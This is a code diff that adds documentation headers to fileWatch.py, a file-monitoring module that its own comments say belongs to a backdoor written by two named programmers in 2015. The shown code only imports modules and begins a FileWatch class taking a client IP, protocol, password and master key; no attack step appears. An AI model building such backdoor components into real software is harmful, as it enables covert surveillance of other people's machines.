@@ -1,8 +1,33 @@
+#!/usr/bin/python
+
+#-----------------------------------------------------------------------------
+#-- SOURCE FILE:    fileWatch.py -   File Monitoring for client and Backdoor
+#--
+#-- FUNCTIONS:      on_created(self, event)
+#--                 on_deleted(self, event)
+#--                 on_moved(self, event)
+#--
+#-- DATE:           November 29, 2015
+#--
+#-- PROGRAMMERS:    Brij Shah & Callum Styan
+#--
+#-- NOTES:
+#-- File monitor object for the backdoor. Includes various file event 
+#-- monitoring methods.
+#-----------------------------------------------------------------------------
+
 import watchdog, helpers, configfile, time, encryption
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 
-# object for watching for files on the machine
+#-----------------------------------------------------------------------------
+#-- CLASS:          FileWatch(FileSystemEventHandler)
+#--
+#-- VARIABLES(S):   FileSystemEventHandler  
+#--
+#-- NOTES:
+#-- Object for watching for files on the machine.
+#-----------------------------------------------------------------------------
 class FileWatch(FileSystemEventHandler):
   clientIP = ""
   def __init__(self, clientIP, protocol, password, masterkey):
